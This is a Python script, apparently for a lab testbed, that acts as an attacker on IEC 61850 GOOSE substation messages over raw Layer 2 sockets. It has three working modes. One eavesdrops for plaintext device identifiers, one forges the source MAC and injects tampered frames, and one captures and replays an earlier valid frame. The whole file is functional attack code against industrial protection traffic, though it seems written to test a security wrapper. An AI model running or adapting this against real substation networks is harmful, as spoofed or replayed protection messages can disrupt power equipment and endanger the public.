#!/usr/bin/env python3
import time
import argparse
import socket
import struct

parser = argparse.ArgumentParser(description="Layer 2 GOOSE Adversary (Raw Sockets)")
parser.add_argument("--attack", type=str, choices=['eavesdrop', 'tamper', 'replay'], default='eavesdrop')
args = parser.parse_args()

GOOSE_TYPE = 0x88B8
IFACE = "h3-eth0"

captured_raw_frames = []
has_replayed = False  

# A fake MAC address to identify our own tampered packets so we don't process them twice
ATTACKER_MAC = b'\xde\xad\xbe\xef\x00\x00'

def start_hacker():
    print(f"[*] =======================================")
    print(f"[*] HACKER TERMINAL ONLINE | Interface: {IFACE}")
    print(f"[*] Attack Mode: {args.attack.upper()}")
    print(f"[*] =======================================\n")
    
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(GOOSE_TYPE))
        sock.bind((IFACE, 0))
    except PermissionError:
        print("[!] Error: Raw sockets require root/sudo privileges.")
        return

    while True:
        raw_frame = sock.recv(2048)
        
        # We expect at least 14 (Ethernet) + 8 (Timestamp) = 22 bytes
        if len(raw_frame) < 22: 
            continue
            
        eth_header = raw_frame[:14]
        src_mac = eth_header[6:12]
        
        # Ignore our own tampered packets to prevent routing loops
        if src_mac == ATTACKER_MAC:
            continue

        timestamp = raw_frame[14:22]
        secure_stream = raw_frame[22:]
        
        print(f"\n[!!!] INTERCEPTED GOOSE FRAME [!!!]")
        
        # --- 1. EAVESDROP ATTACK (Breaks Confidentiality) ---
        if args.attack == 'eavesdrop':
            # We check for known plaintext strings from your PyGoose generator
            # Decoding with 'ignore' allows us to search through raw binary without crashing
            stolen_text = secure_stream.decode('ascii', errors='ignore')
            
            if "SEL_421" in stolen_text or "LLN0" in stolen_text:
                print("    [!] Status: VULNERABLE. Plaintext GOOSE structure detected.")
                # Print a clean version of the extracted strings
                clean_strings = ''.join([c if c.isprintable() else '.' for c in stolen_text])
                print(f"    [!] Extracted Data: {clean_strings[:60]}...")
            else:
                # If we don't see those strings, the cryptographic wrapper is working
                print(f"    [?] Status: SECURE. Payload appears to be encrypted/scrambled.")
                print(f"    [?] Ciphertext Bytes: {secure_stream[:15].hex()}... (Unreadable)")

        # --- 2. TAMPER ATTACK (Breaks Integrity / Authentication) ---
        elif args.attack == 'tamper':
            if len(secure_stream) > 4:
                # Swap out the last 4 bytes of the payload to invalidate the MAC/Signature or ASN.1 structure
                tampered_stream = secure_stream[:-4] + b"DEAD"
                
                # Forge the Ethernet header with our ATTACKER_MAC as the source
                forged_eth_header = eth_header[:6] + ATTACKER_MAC + eth_header[12:14]
                
                poisoned_frame = forged_eth_header + timestamp + tampered_stream
                time.sleep(0.005) 
                sock.send(poisoned_frame)
                print(f"    [+] Poisoned frame injected! Replaced end of payload with 'DEAD'")
                print(f"    [+] Let's see if the Subscriber's Authentication catches it...")

        # --- 3. REPLAY ATTACK (Breaks Freshness / Availability) ---
        elif args.attack == 'replay':
            global has_replayed
            captured_raw_frames.append(raw_frame)
            print(f"    [>] REPLAY: Packet captured. Stored: {len(captured_raw_frames)}")
            
            # Trigger the attack exactly once on the 10th packet
            if len(captured_raw_frames) == 10 and not has_replayed:
                print("    [+] Triggering Replay Attack!")
                print("    [+] Spoofing Publisher MAC and blasting Packet #5 again...")
                time.sleep(0.05)
                # Send an older, valid packet (e.g., the 5th packet we captured)
                sock.send(captured_raw_frames[4]) 
                has_replayed = True
                print("    [+] Replay frame successfully blasted onto the wire!")
                print(f"    [+] Let's see if the Subscriber's Nonce/Timestamp Tracking drops it...")

if __name__ == "__main__":
    start_hacker()